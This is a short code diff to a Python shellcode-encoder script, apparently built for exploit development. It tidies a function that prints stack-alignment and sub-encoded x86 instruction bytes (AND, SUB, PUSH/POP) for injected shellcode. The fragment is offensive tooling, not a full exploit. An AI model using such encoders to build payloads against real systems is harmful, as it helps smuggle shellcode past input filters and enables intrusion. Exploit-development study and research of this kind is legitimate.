@@ -621,7 +621,6 @@ def encodeAddress(x,y):
     print("\"\\x50\"") #PUSH EAX
     print("\"\\x5c\"") # POP ESP
 
-
 def padAndStrip(byte):
     address = str.format('\\x{:02x}', int(byte,16))
     return address
@@ -641,7 +640,6 @@ def genShellcode(shellcode):
     print("shellcode = (")
     # Set up location of where the shellcode will be decoded:
     #encodeAddress(addy1, addy2)
-    first = str("\"\\x25\\x4A\\x4D\\x4E\\x55\\x25\\x35\\x32\\x31\\x2A\\x54\\x58\\x2D\\x66\\x4D\\x55\\x55\\x2D\\x66\\x4B\\x55\\x55\\x2D\\x6A\\x50\\x55\\x55\\x50\\x5C\"")
     first = str("\"\\x25\\x4A\\x4D\\x4E\\x55\\x25\\x35\\x32\\x31\\x2A\\x54\\x58\\x2D\\x66\\x4D\\x55\\x55\\x2D\\x66\\x4B\\x55\\x55\\x2D\\x6A\\x50\\x55\\x55\\x50\\x5C\"")
     shellcode.reverse()
     print(first)
